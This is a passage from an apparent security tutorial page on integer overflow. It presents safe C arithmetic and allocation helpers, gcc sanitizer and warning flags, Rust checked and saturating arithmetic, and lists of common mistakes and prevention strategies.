<span class="normal">90</span>
<span class="normal">91</span>
<span class="normal">92</span>
<span class="normal">93</span>
<span class="normal">94</span>
<span class="normal">95</span>
<span class="normal">96</span>
<span class="normal">97</span>
<span class="normal">98</span>
<span class="normal">99</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// safe_arithmetic.c - Safe integer operations</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;limits.h&gt;</span>

<span class="c1">// Safe addition</span>
<span class="kt">bool</span><span class="w"> </span><span class="nf">safe_add_uint</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">UINT_MAX</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w">  </span><span class="c1">// Overflow would occur</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">bool</span><span class="w"> </span><span class="nf">safe_add_int</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">b</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">INT_MAX</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w">  </span><span class="c1">// Positive overflow</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">b</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">INT_MIN</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w">  </span><span class="c1">// Negative overflow</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Safe multiplication</span>
<span class="kt">bool</span><span class="w"> </span><span class="nf">safe_mul_uint</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">UINT_MAX</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w">  </span><span class="c1">// Overflow would occur</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">bool</span><span class="w"> </span><span class="nf">safe_mul_size_t</span><span class="p">(</span><span class="kt">size_t</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">SIZE_MAX</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w">  </span><span class="c1">// Overflow would occur</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Safe array allocation</span>
<span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">safe_array_alloc</span><span class="p">(</span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">element_size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">total_size</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">safe_mul_size_t</span><span class="p">(</span><span class="n">count</span><span class="p">,</span><span class="w"> </span><span class="n">element_size</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">total_size</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Array allocation would overflow</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">total_size</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Safe buffer operations</span>
<span class="kt">bool</span><span class="w"> </span><span class="nf">safe_buffer_copy</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">dest_size</span><span class="p">,</span><span class="w"> </span>
<span class="w">                     </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">src_size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">src_size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">dest_size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Source too large for destination</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="n">src_size</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Example usage</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">;</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">safe_add_uint</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Addition result: %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">result</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Addition would overflow</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Safe array allocation</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1000000</span><span class="p">;</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">element_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">);</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">safe_array_alloc</span><span class="p">(</span><span class="n">count</span><span class="p">,</span><span class="w"> </span><span class="n">element_size</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">array</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Array allocated successfully</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Array allocation failed or would overflow</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<h3 id="compiler-based-protections">Compiler-Based Protections</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Enable integer overflow detection</span>
gcc<span class="w"> </span>-fsanitize<span class="o">=</span>signed-integer-overflow<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-fsanitize<span class="o">=</span>unsigned-integer-overflow<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-ftrapv<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-o<span class="w"> </span>protected_program<span class="w"> </span>program.c

<span class="c1"># Enable all warnings</span>
gcc<span class="w"> </span>-Wall<span class="w"> </span>-Wextra<span class="w"> </span>-Wconversion<span class="w"> </span>-Wsign-conversion<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-Woverflow<span class="w"> </span>-o<span class="w"> </span>warned_program<span class="w"> </span>program.c

<span class="c1"># Use safe alternatives</span>
<span class="c1"># Consider using languages with built-in overflow protection</span>
</code></pre></div></td></tr></table></div>
<h3 id="language-level-solutions">Language-Level Solutions</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// Rust example with built-in overflow protection</span>
<span class="k">fn</span><span class="w"> </span><span class="nf">safe_arithmetic_rust</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="p">:</span><span class="w"> </span><span class="kt">u32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">u32</span><span class="p">::</span><span class="n">MAX</span><span class="p">;</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">b</span><span class="p">:</span><span class="w"> </span><span class="kt">u32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// This will panic in debug mode, wrap in release mode</span>
<span class="w">    </span><span class="c1">// let result = a + b;</span>

<span class="w">    </span><span class="c1">// Safe operations</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">checked_add</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">Some</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Result: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">result</span><span class="p">),</span>
<span class="w">        </span><span class="nb">None</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Overflow detected&quot;</span><span class="p">),</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Saturating arithmetic</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">saturated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">saturating_add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
<span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Saturated result: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">saturated</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Wrapping arithmetic (explicit)</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">wrapped</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">wrapping_add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
<span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Wrapped result: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">wrapped</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<h2 id="key-takeaways">Key Takeaways</h2>
<div class="admonition important">
<p class="admonition-title">Integer Overflow Fundamentals</p>
<ul>
<li><strong>Arithmetic can exceed type limits</strong> - Addition and multiplication are common sources</li>
<li><strong>Wraparound behavior varies</strong> - Signed vs unsigned have different overflow behavior  </li>
<li><strong>Memory operations are vulnerable</strong> - malloc, memcpy, array indexing affected</li>
<li><strong>Validation can be bypassed</strong> - Overflow can make large values appear small</li>
<li><strong>Combined with other bugs</strong> - Often enables exploitation of other vulnerabilities</li>
</ul>
</div>
<div class="admonition warning">
<p class="admonition-title">Common Mistakes</p>
<ul>
<li>Not checking for overflow in size calculations</li>
<li>Mixing signed and unsigned types without validation</li>
<li>Assuming larger types prevent overflow</li>
<li>Only checking upper bounds in validation</li>
<li>Using user input directly in arithmetic operations</li>
</ul>
</div>
<div class="admonition tip">
<p class="admonition-title">Prevention Strategies</p>
<ul>
<li>Use safe arithmetic functions that check for overflow</li>
<li>Validate inputs before arithmetic operations</li>
<li>Use appropriate data types for the expected value range</li>
<li>Enable compiler warnings and sanitizers during development</li>
<li>Consider using languages with built-in overflow protection</li>
</ul>
</div>
<hr />
<p><em>Next: <a href="../../protection/01-mitigations/">Understanding Mitigations</a></em></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.sections", "search.highlight"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
      
    
  </body>
</html>